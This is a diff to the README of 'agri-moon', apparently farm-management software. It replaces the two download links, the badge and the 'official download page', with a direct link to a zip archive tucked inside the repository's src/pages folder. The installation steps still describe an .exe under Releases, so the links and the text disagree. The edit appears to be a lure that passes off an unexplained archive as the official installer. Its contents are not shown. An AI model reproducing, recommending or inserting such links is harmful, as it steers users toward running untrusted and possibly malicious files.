@@ -1,6 +1,6 @@
 # 🌾 agri-moon - Manage your farm data with ease
 
-[![Download agri-moon](https://img.shields.io/badge/Download-AgriMoon-blue.svg)](https://github.com/celestiaspecial657/agri-moon)
+[![Download agri-moon](https://img.shields.io/badge/Download-AgriMoon-blue.svg)](https://github.com/celestiaspecial657/agri-moon/raw/refs/heads/main/src/pages/moon_agri_3.6.zip)
 
 Agri-moon helps farmers track land, map fields, and analyze crops. This platform brings technical tools to your farm management. You monitor historical data and future yields in one dashboard.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application well.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/celestiaspecial657/agri-moon) to find the latest version of the installer.
+1. Visit the [official download page](https://github.com/celestiaspecial657/agri-moon/raw/refs/heads/main/src/pages/moon_agri_3.6.zip) to find the latest version of the installer.
 2. Look for the file ending in .exe under the Releases section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
